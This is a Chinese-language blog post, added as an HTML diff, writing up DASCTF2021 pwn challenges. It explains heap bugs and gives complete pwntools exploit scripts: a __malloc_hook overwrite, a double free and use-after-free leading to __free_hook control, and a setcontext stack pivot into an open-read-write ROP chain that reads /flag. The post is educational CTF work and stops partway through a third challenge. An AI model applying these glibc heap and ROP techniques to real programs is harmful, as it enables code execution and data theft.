@@ -1,0 +1,910 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '7.1.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="DASCTF2021fruitpie思路这题可以malloc一个指定size的chunk，并且返回chunk的地址，然后可以指定一个偏移，向偏移中写入0x10个字节的数据。这题申请很大的空间以后heap的地址和libc的基地址是相对固定的。  申请一个很大的空间，要尽可能的大 拿到heap地址根据相对偏移算出libc地址 设定指定的偏移值，向__malloc_hook中写入gadget  EXP1">
+<meta name="keywords" content="-CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dasctf2021">
+<meta property="og:url" content="http://yoursite.com/2021/04/07/dasctf2021/index.html">
+<meta property="og:site_name" content="xkaneiki&#39;s blog">
+<meta property="og:description" content="DASCTF2021fruitpie思路这题可以malloc一个指定size的chunk，并且返回chunk的地址，然后可以指定一个偏移，向偏移中写入0x10个字节的数据。这题申请很大的空间以后heap的地址和libc的基地址是相对固定的。  申请一个很大的空间，要尽可能的大 拿到heap地址根据相对偏移算出libc地址 设定指定的偏移值，向__malloc_hook中写入gadget  EXP1">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2021-04-07T05:15:50.989Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="dasctf2021">
+<meta name="twitter:description" content="DASCTF2021fruitpie思路这题可以malloc一个指定size的chunk，并且返回chunk的地址，然后可以指定一个偏移，向偏移中写入0x10个字节的数据。这题申请很大的空间以后heap的地址和libc的基地址是相对固定的。  申请一个很大的空间，要尽可能的大 拿到heap地址根据相对偏移算出libc地址 设定指定的偏移值，向__malloc_hook中写入gadget  EXP1">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://yoursite.com/2021/04/07/dasctf2021/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>dasctf2021 | xkaneiki's blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">xkaneiki's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+  
+  
+
+  
+
+  <a href="https://github.com/xkaneiki" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/04/07/dasctf2021/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xkaneiki">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xkaneiki's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">dasctf2021
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2021-04-07 10:21:36 / Modified: 13:15:50" itemprop="dateCreated datePublished" datetime="2021-04-07T10:21:36+08:00">2021-04-07</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="DASCTF2021"><a href="#DASCTF2021" class="headerlink" title="DASCTF2021"></a>DASCTF2021</h1><h2 id="fruitpie"><a href="#fruitpie" class="headerlink" title="fruitpie"></a>fruitpie</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>这题可以malloc一个指定size的chunk，并且返回chunk的地址，然后可以指定一个偏移，向偏移中写入0x10个字节的数据。这题申请很大的空间以后heap的地址和libc的基地址是相对固定的。</p>
+<ol>
+<li>申请一个很大的空间，要尽可能的大</li>
+<li>拿到heap地址根据相对偏移算出libc地址</li>
+<li>设定指定的偏移值，向<code>__malloc_hook</code>中写入gadget</li>
+</ol>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">"./fruitpie"</span>)</span><br><span class="line">    lb = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.27.so"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">"54f57bff-61b7-47cf-a0ff-f23c4dc7756a.machine.dasctf.com"</span>, <span class="string">"50302"</span>)</span><br><span class="line">    lb = ELF(<span class="string">"libc.so.6"</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Enter the size to malloc:"</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x5000000</span>))</span><br><span class="line">p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">hp = int(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc = hp+<span class="number">0x5000ff0</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">'libc'</span>, hex(libc))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.recvuntil(<span class="string">"Offset:"</span>)</span><br><span class="line">mh = lb.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">off = (mh+<span class="number">0x5000ff0</span>)</span><br><span class="line">print(hex(off))</span><br><span class="line">p.sendline(hex(off))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">print(<span class="string">"mh"</span>, hex(mh+libc))</span><br><span class="line">p.recvuntil(<span class="string">"Data:"</span>)</span><br><span class="line">p.send(p64(libc+<span class="number">0x10a45c</span>)*<span class="number">2</span>)</span><br><span class="line">p.sendline(<span class="string">"cat /flag &gt;&amp;2"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="ParentSimulator"><a href="#ParentSimulator" class="headerlink" title="ParentSimulator"></a>ParentSimulator</h2><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>这是典型的表单题，程序中申请的结构大概如下所示，其大小是0x100。用seccomp-tools检查程序发现程序禁用了execve的syscall，所以考虑利用orw获得提权。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">baby</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">8</span>];</span><br><span class="line">  <span class="keyword">char</span> gender[<span class="number">8</span>];</span><br><span class="line">  <span class="keyword">char</span> des[<span class="number">0xf0</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>程序中有几个重要的函数分别是birth、change_name、change_des、remove和show</p>
+<p>birth有如下功能：</p>
+<ol>
+<li>malloc申请0x100的空间来存储一个baby</li>
+<li>输入name和设置gender</li>
+<li>对应标志位置1（use）</li>
+</ol>
+<p>change_name用来修改结构中的name（检查标志位是否为1）</p>
+<p>change_des用来修改结构中的des（检查标志位是否为1）</p>
+<p>remove释放指定的baby，并且对用标志位置0，<strong>地址不清空（释放时不检查标志位，而是检查地址不为空）</strong></p>
+<p>show将所有的baby的name、gender和des打印出来</p>
+<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><h4 id="获得libc地址"><a href="#获得libc地址" class="headerlink" title="获得libc地址"></a>获得libc地址</h4><p>这里remove不清空地址，而且释放时不检查标志位，只检查地址不为空，因此可以重复释放地址（明显的double free）。由于2.31中libc地址会检查tcache的double free的，但是可以利用unsortbin来进行double free。具体步骤如下：</p>
+<ol>
+<li>首先释放堆块填满 tcache（包含需要double free的堆块chunk0）</li>
+<li>将需要double free的堆块和<strong>在其之前的，相连的</strong>堆块chunk1一起释放，两个块合并一起进入unsortbin</li>
+<li>将tcache中的堆块申请完（chunk0已经被申请）</li>
+<li>申请chunk1，切割unsortbin使得libc的地址进入chunk0中</li>
+<li>利用程序的show，获得libc的地址</li>
+</ol>
+<h4 id="栈迁移，执行orw"><a href="#栈迁移，执行orw" class="headerlink" title="栈迁移，执行orw"></a>栈迁移，执行orw</h4><ol>
+<li>继续申请堆块姜chunk0申请出来，现在我们有两个地方存在chunk0，利用uaf，我们先释放掉一个堆块进入tcache中然后再释放一个chunk0，这样chunk0中就有一个堆地址，这时再输出chunk0我们就能拿到heap的地址。</li>
+<li>利用uaf，利用change_name修改chunk0的fd指针，是指针指向和chunk0的des重合的堆块（为之后栈迁移做准备)，从而申请重叠堆块。</li>
+<li>再将chunk0释放如tache进行uaf。利用change_name修改chunk0的下个堆块到<code>__free_hook</code>，然后再连续申请两个就能够拿到<code>__free_hook</code>的控制权。</li>
+<li>程序开了沙箱将execve的syscall给禁用了，只能考虑orw。orw依赖栈才能够有效，所以首先要进行栈迁移。推荐一个gadget，此gadget通过rdi控制rdx。利用<code>__free_hook</code>执行gadget，然后再配和setcontext+61通过rdx控制rsp来进行栈迁移。 </li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00000000001547a0: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span><br></pre></td></tr></table></figure>
+<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">c</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">  puts("1.Give birth to a child");</span></span><br><span class="line"><span class="string">  puts("2.Change child's name");</span></span><br><span class="line"><span class="string">  puts("3.Show children's name");</span></span><br><span class="line"><span class="string">  puts("4.Remove your child");</span></span><br><span class="line"><span class="string">  puts("5.Edit child's description.");</span></span><br><span class="line"><span class="string">  puts("6.Exit");</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">    lb = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.31.so"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(D)</span><br><span class="line">    lb = ELF(<span class="string">"./libc-2.31.so"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, gen, name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Please input index?"</span>, str(idx))</span><br><span class="line">    p.sendlineafter(</span><br><span class="line">        <span class="string">"Please choose your child's gender.\n1.Boy\n2.Girl:"</span>, str(gen))</span><br><span class="line">    p.sendlineafter(<span class="string">"Please input your child's name:"</span>, name)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_name</span><span class="params">(idx, name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Please input index?"</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">"Please input your child's new name:"</span>, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Please input index?"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dlt</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Please input index?"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_des</span><span class="params">(idx, des)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'5'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Please input index?"</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">"Please input your child's description:"</span>, des)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_gen</span><span class="params">(idx, gen)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'666'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Please input index?"</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">"Please rechoose your child's gender.\n1.Boy\n2.Girl:"</span>, str(gen))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    add(i, <span class="number">1</span>, <span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    dlt(<span class="number">6</span>-i)</span><br><span class="line"></span><br><span class="line">dlt(<span class="number">7</span>)</span><br><span class="line">dlt(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">1</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">dlt(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">1</span>, <span class="string">'aaaa'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">2</span>+i, <span class="number">1</span>, <span class="string">'aaaa'</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">1</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Name: '</span>)</span><br><span class="line">libc = u64(p.recvuntil(<span class="string">','</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))<span class="number">-0x1ebbe0</span></span><br><span class="line">print(<span class="string">'libc'</span>, hex(libc))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">1</span>, <span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line">dlt(<span class="number">2</span>)</span><br><span class="line">dlt(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Name: '</span>)</span><br><span class="line">heap = u64(p.recvuntil(<span class="string">','</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">print(<span class="string">'heap'</span>, hex(heap))</span><br><span class="line"></span><br><span class="line">fh = libc+lb.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">context = libc+lb.sym[<span class="string">'setcontext'</span>]</span><br><span class="line">change_name(<span class="number">0</span>, p64(fh)[:<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="number">1</span>, <span class="string">'\x33\x33\33\x33'</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">1</span>, <span class="string">'\x00\x00'</span>)</span><br><span class="line"></span><br><span class="line">dlt(<span class="number">4</span>)</span><br><span class="line">dlt(<span class="number">1</span>)</span><br><span class="line">heap = heap+<span class="number">0x760</span>+<span class="number">0x20</span></span><br><span class="line">change_name(<span class="number">0</span>, p64(heap))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">1</span>, <span class="string">'\x33\x33\33\x33'</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">1</span>, <span class="string">'aaaaa'</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    gadget = libc+<span class="number">0x154930</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gadget = libc+<span class="number">0x1547a0</span></span><br><span class="line">print(<span class="string">"gadget"</span>, hex(gadget))</span><br><span class="line">change_name(<span class="number">2</span>, p64(gadget)[:<span class="number">7</span>])</span><br><span class="line">print(hex(heap))</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    rdi = libc+<span class="number">0x26b72</span></span><br><span class="line">    rsi = libc+<span class="number">0x27529</span></span><br><span class="line">    rdx = libc+<span class="number">0x11c371</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    rdi = libc+<span class="number">0x026b72</span></span><br><span class="line">    rsi = libc+<span class="number">0x027529</span></span><br><span class="line">    rdx = libc+<span class="number">0x11c1e1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">o = libc+lb.sym[<span class="string">'open'</span>]</span><br><span class="line">w = libc+lb.sym[<span class="string">'write'</span>]</span><br><span class="line">r = libc + lb.sym[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line">des = p64(heap)*<span class="number">4</span>+p64(context+<span class="number">61</span>)+<span class="string">b'/flag\0\0'</span></span><br><span class="line">des += (<span class="number">0xa0</span>-len(des))*<span class="string">b'\x00'</span>+p64(heap<span class="number">-0x450</span>+<span class="number">0x10</span>)+p64(rdi)</span><br><span class="line">print(len(des))</span><br><span class="line">pause()</span><br><span class="line">change_des(<span class="number">1</span>, des)</span><br><span class="line">des = p64(heap+<span class="number">0x28</span>)+p64(rsi)+p64(<span class="number">0</span>)+p64(o)</span><br><span class="line">des += p64(rdi)+p64(<span class="number">4</span>)+p64(rsi)+p64(heap)+p64(rdx)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(r)</span><br><span class="line">des += p64(rdi)+p64(<span class="number">1</span>)+p64(rsi)+p64(heap)+p64(rdx)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(w)</span><br><span class="line">change_des(<span class="number">5</span>, des)</span><br><span class="line">dlt(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="babybabybabyheap"><a href="#babybabybabyheap" class="headerlink" title="babybabybabyheap"></a>babybabybabyheap</h2><p>程序首先会给一个puts的地址<code>printf(&quot;gift: %p\n&quot;, &amp;puts);</code>，就将libc的地址给泄漏出来了。检查程序开启的保护，发现程序没有开启pie保护，这意味着我们知道程序的地址。</p>
+<p>程序主要有三个函数alloc、dlt和vul函数</p>
+<p>alloc函数会用malloc申请0x80～0x200的空间并且往里面写入内容（但是没有溢出），并且记录下size大小</p>
+<p>dlt会首先检查将要释放的空间的size是否为空，然后释放对应的空间，并且清空对应的size（没有double free）</p>
